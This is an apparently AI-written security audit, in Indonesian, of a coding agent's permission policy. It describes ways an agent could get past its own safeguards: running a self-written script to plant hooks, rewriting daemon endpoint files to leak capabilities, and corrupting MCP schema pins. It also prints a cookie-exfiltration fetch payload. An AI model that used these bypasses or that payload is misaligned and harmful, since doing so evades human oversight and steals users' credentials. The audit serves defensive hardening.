# Audit rilis 0.43.0 working tree — 2026-11-23

Artefak audit **read-only** atas perubahan yang belum di-commit di checkout ini.
Tidak ada kode yang diubah, tidak ada test/gate yang dijalankan. Semua temuan
berasal dari pembacaan kode dan dokumen di working tree; nomor baris mengacu
pada isi file saat audit. Dua sub-agent (`audit-policy-deep`, `audit-ui-deep`)
gagal karena batas langkah/abort; temuan parsialnya diverifikasi manual dan
dimasukkan di bawah.

## Ruang lingkup

- `src/policy/{permission,jail,bash-guard,tool-contract,allowlist}.ts`
- `src/tools/{edit,write_file,patch}.ts`
- `src/mcp/client.ts`, `src/daemon/{discovery,client}.ts`, `cli/commands/daemon.ts`
- `src/ui/{assistant/simple,tui/app,session-state,render/errors}.ts`
- `cli/recovery-warning.ts`, test terkait, `docs/`, `docs-en/`, `CHANGELOG.md`

Perubahan inti yang diaudit: pembalikan kebijakan tulis `.minicode/**` oleh
owner 2026-11-23 (hook tetap dikunci), entri allowlist `agent-browser`, dan
perluasan pemakaian `friendlyToolErrorCanonical()` di UI/recovery.

---

## P1 — Kunci hook dapat dilewati lewat skrip yang dijalankan

**Bukti:** `src/tools/write_file.ts` boleh menulis `.js` di workspace;
`src/policy/permission.ts:261` mengizinkan pola `"node *"`; bash-guard hanya
menganalisis teks perintah, bukan efek proses. `src/policy/permission.ts:1251-1262`
melindungi `.minicode/hooks/**` hanya untuk nama tool tulis dan kata-kata
pembaca di `src/policy/bash-guard.ts:390-391`.

**Skenario:** `write_file` → `evil.js` (di workspace), lalu `node evil.js`.
Skrip bebas `fs.writeFileSync(".minicode/hooks/x.js", …)` tanpa melewati
permission layer sama sekali. Bash-guard tidak melihat tulis itu.

**Dampak:** kode arbitrer dipasang di direktori hook yang dipindai otomatis
saat `MINICODE_HOOKS=1`. Ini mengalahkan "satu-satunya kunci yang tersisa"
setelah kebijakan baru. Celah ini sudah ada sebelumnya (dulu kunci penuh
`.minicode/**` juga dilewati cara yang sama), tetapi sekarang konsekuensinya
lebih besar.

**Catatan terkait:**
- `src/policy/permission.ts:1198` return-allow untuk `unrestricted` terjadi
  **sebelum** blok hook di 1251 → hook write juga lolos di EXECUTE/unrestricted.
- `READERS` di `src/policy/bash-guard.ts:390-391` tidak memuat `unzip`, `7z`,
  `patch`, `git apply`, `ren`, `truncate`, `perl -pi`, sehingga
  `unzip x.zip -d .minicode/hooks` tidak tersaring.
- `node *`/`bun run *` ada di allowlist narrow maupun developer.

**Rekomendasi:** tegakkan kunci hook di runtime/tool layer (mis. `safe-open`
menolak target hook untuk semua penulis, termasuk proses turunan), bukan di
permission layer semata; mengunci `node`/`bun` tidak cukup karena jalur lain
masih ada. Perlu keputusan owner karena menyentuh model eksekusi.

---

## P1 — Allowlist `agent-browser` membuka eksekusi JS dan egress tanpa approval

**Bukti:** `src/policy/permission.ts:280-283` mendaftarkan
`agent-browser install*`, `eval*`, `--auto-connect*`, `mcp*`. `npmNpxSafe()`
(`permission.ts:474-476`) hanya menolak backtick/`$`/`<`/`>`. `bash-guard`
tidak punya aturan untuk subcommand `eval`. Komentar `permission.ts:284-287`
beralasan `"npx *" sudah mencakup semua`, tetapi pola itu justru mengizinkan
paket npm apa pun.

**Skenario:** `agent-browser eval "await fetch('https://x/?c='+document.cookie)"`
lolos allowlist tanpa prompt; `--auto-connect` menempel ke Chrome yang sudah
login. `agent-browser install` mengunduh/menjalankan biner browser dari
jaringan tanpa approval.

**Rekomendasi:** keluarkan `eval`, `mcp`, `install`, `--auto-connect` dari
allowlist (tetap izinkan lewat approval eksplisit). Perbaiki narasi komentar
`npx *`: itu bukan jaminan keamanan.

---

## P1 — File rahasia daemon dapat ditimpa agen

**Bukti:** `SENSITIVE_RE` (`src/policy/jail.ts:10-11`) hanya melindungi
`.minicode/auth.json`, bukan `daemon-endpoint.json` / `daemon-lease.json`.
`readEndpoint()` (`src/daemon/discovery.ts:134-155`) hanya memvalidasi bentuk;
`host` diterima string apa pun. `openClient()` (`cli/commands/daemon.ts:179-187`)
mengeluarkan capability dari file itu lalu terhubung ke `ep.host:ep.port`.

**Skenario:** agen menulis `<cwd>/.minicode/daemon-endpoint.json` berisi
`host` + `port` + `bootstrap` pilihannya; perintah daemon berikutnya
mengirim capability ke server itu. `writeAtomic()` (`discovery.ts:110-125`)
juga mengganti inode, sehingga hardening `icacls` khusus endpoint hilang
bila file ditimpa file tool generik (POSIX `0600` masih dijaga
`atomicWriteText()`).

**Rekomendasi:** masukkan `daemon-endpoint.json`, `daemon-lease.json`,
`mcp-schema-pins.json` ke `SENSITIVE_RE` atau ke daftar kunci tulis khusus;
pertahankan `icacls` saat penulisan ulang.

---

## P2 — Deteksi drift MCP menjadi fail-open

**Bukti:** `McpSchemaPinRegistry.load()` menelan JSON rusak
(`src/mcp/client.ts:153-155`). `pinMany()` (`client.ts:205-215`) dan `verify()`
(`client.ts:226-235`) memperlakukan pin yang tidak ada sebagai `"pinned"`.
File pin ada di `<cwd>/.minicode/mcp-schema-pins.json` (`client.ts:260-268`)
dan sekarang boleh dihapus/ditulis agen.

**Skenario:** agen menghapus atau menimpa pin dengan JSON rusak → sesi berikutnya
menerima skema MCP (mungkin berbahaya) sebagai pin baru tanpa peringatan
`MCP_SCHEMA_DRIFT_DETECTED`.

**Rekomendasi:** bedakan "pin belum ada" (bootstrapping) dari "file pin rusak/
dihapus setelah sebelumnya ada"; keduanya harus fail-closed untuk drift.

---

## P2 — Test basi akibat pembalikan kebijakan

- `test/permission-matrix.test.ts:300-328` menuntut `deny` untuk
  `write_file`/`edit`/`delete_file`/`move_file` pada `.minicode/**`.
  `handlers.auto` mengizinkan file write di `src/policy/permission.ts:1151`,
  jadi expectation pertama (`auto`) sudah gagal; `allow-all` juga gagal.
- `test/mcp-server.test.ts:248-257` menuntut `isError` untuk
  `write_file .minicode/sessions.db` dengan `--allow-all`; sekarang tulis
  berhasil.
- `test/final-adversarial.test.ts:486` masih lolos hanya karena mode AUTO
  menolak file write tanpa approval, bukan karena kunci owned-state; alasan
  deny berubah dari `jail: owned state` menjadi `not authorized in AUTO mode`.

**Rekomendasi:** ubah expectation ke perilaku baru, tambah test eksplisit
bahwa `.minicode/hooks/**` tetap ditolak di semua mode, dan perbarui test
yang bergantung pada teks alasan deny.

**Verifikasi yang belum dijalankan:** `bun test test/permission-matrix.test.ts
test/mcp-server.test.ts test/deny-reason.test.ts test/permission-adversarial.test.ts
test/bash-guard-redirect-escape.test.ts test/allowlist-segments.test.ts
test/p92-recovery-warning-envelope.test.ts test/delegate-audit.test.ts`
+ `tsc --noEmit`.

---

## P2 — Dokumentasi kebijakan dan changelog tertinggal

- `docs/policy-sandbox.md:33,89` dan mirror `docs-en/policy-sandbox.md:33,87`
  masih menyatakan `write_file .minicode/<apa-pun>` ditolak fail-closed.
- `docs/security.md:76-80` dan `docs-en/security.md:25,68-69` masih menyatakan
  state runtime `.minicode/` terkunci penuh untuk file tool.
- Daftar allowlist narrow di `docs/policy-sandbox.md:51`,
  `docs-en/policy-sandbox.md:51`, `docs-en/security.md:41` belum menyebut
  entri `agent-browser` baru.
- `CHANGELOG.md` entri 0.43.x tidak mencatat pembalikan kebijakan tulis
  `.minicode/**` maupun perluasan allowlist browser.

**Catatan pembeda:** `docs/TERMINAL_CONTRACT.md:207-215` **sudah** mengatur
redaksi error tanpa pola kanonik, jadi tidak termasuk temuan ini.

---

## P3 — Inkonsistensi deskripsi tool dan kode mati

- `src/tools/patch.ts:13` masih bertuliskan "Cannot edit outside the workspace
  or `.minicode/ state.`", sementara `src/tools/edit.ts:142` dan
  `src/tools/write_file.ts:16` kini menyatakan `.minicode/` diizinkan oleh
  keputusan owner. `test/audit-fix-wire-contract.test.ts:113-129` hanya
  memeriksa kalimat aturan keputusan yang sama, jadi kontradiksi ini tidak
  tertangkap. Risiko: model memilih tool yang salah / ragu menulis state.
- `isTrashRestore()` (`src/policy/jail.ts:123-127`) tidak lagi dipanggil
  siapa pun setelah kunci owned-state dicabut; dead code.
- `boundRecoveryPreview()` (`cli/recovery-warning.ts:121`) memotong teks
  menjadi 240 karakter **sebelum** `friendlyToolErrorCanonical()` dipanggil
  (baris 128), sehingga pola kanonik yang letaknya di ekor pesan panjang
  tidak terdeteksi dan laporan berubah menjadi "withheld · details in journal".
- Redaksi error tidak simetris: TUI `src/ui/tui/app.ts:1349-1351` fallback
  ke `formatError(e)` (tetapi tetap melewati `redactSecrets` + `sanitizeAnsiLine`),
  sedangkan one-shot `src/ui/assistant/simple.ts:860-861` dan recovery
  `cli/recovery-warning.ts:131` menahan seluruh teks tak dikenali.

---

## P3 — Artefak kepercayaan lokal lain yang kini writable

Konsumen berikut di-gate `--allow-local-config` sehingga dampaknya hanya
pada sesi dengan flag itu: `.minicode/config.json`, `.minicode/allowlist.json`,
`.minicode/skills/*.md`. Yang **tidak** di-gate: `mcp-schema-pins.json`
(lihat P2), `MEMORY.md`, `journal-*.jsonl`, `sessions.db`, traces. Dua
terakhir merusak integritas bukti: `move_file .minicode/sessions.db → docs/x`
kini diizinkan, sementara tes lama yang mengunci larangannya dilemahkan.

---

## Status & batas klaim

- Audit ini hanya pembacaan kode. Tidak ada test/gate yang dijalankan,
  sehingga "test basi" adalah prediksi dari kontradiksi kode, bukan hasil
  eksekusi.
- Dua delegasi explore gagal; tidak ada temuan dari mereka yang dipakai
  sebelum diverifikasi manual.
- Tidak ada perubahan kode/sumber yang dibuat oleh audit ini; satu-satunya
  file baru adalah artefak ini (dan baris indeks di `.audit/README.md`).
- Keputusan mana yang dapat dikerjakan tanpa konfirmasi owner: perbaikan
  deskripsi tool, update dokumen, update test basi. Kunci hook di runtime,
  daftar `SENSITIVE_RE`, dan perubahan allowlist `agent-browser` menyentuh
  kebijakan/kepercayaan — butuh keputusan owner.
